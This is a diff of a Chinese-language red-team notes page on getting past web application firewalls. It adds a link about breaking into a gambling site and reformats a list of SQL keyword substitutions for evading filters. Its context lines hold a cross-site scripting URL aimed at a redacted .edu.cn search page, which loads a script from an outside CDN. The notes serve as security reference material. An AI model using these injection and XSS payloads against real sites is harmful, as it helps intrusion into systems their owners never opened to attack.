@@ -31,6 +31,7 @@
 - [浅谈绕过 waf 的数种方法](https://www.waitalone.cn/waf-bypass.html)
 - [绕过云锁文件读取防护](https://drivertom.blogspot.com/2019/06/lfi.html)
 - [TSRC挑战赛：WAF之SQL注入绕过挑战实录](https://security.tencent.com/index.php/blog/msg/66)
+- [简单绕过waf拿下赌博网站](https://xz.aliyun.com/t/9181) - 利用 JavaScript 转写 php
 
 **导图**
 - WAF绕过思路 [png](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/WAF绕过思路.png)
@@ -44,16 +45,16 @@
 
 **关键字替换**
 
-1. AND 等价于 &&
-2. OR 等价于 ||
-3. = 等价于 like
-4. + 代替 空格
+1. AND 等价于 `&&`
+2. OR 等价于 `||`
+3. `=` 等价于 like
+4. `+` 代替 空格
 5. sleep() 等价于 benchmark()
 6. mid()substring() 等价于 substr()
 
-```
 最直白的 payload 类似 `<script> alert('xss'); </script>`,但是你可以用 `<script src=来远程加载脚本,并绕过防护`
 
+```
 `http://██.██.edu.cn/██/██?search=naive%22%3E%20%3Cmeta%20name=%22referrer%22%20content=%22never%22%20%3E%20%3Cscript%20src=%22https://cdn.jsdelivr.net/gh/TomAPU/xsstest/test.js%22%3E%3C/script%3E%20%3C!--`
 ```
 
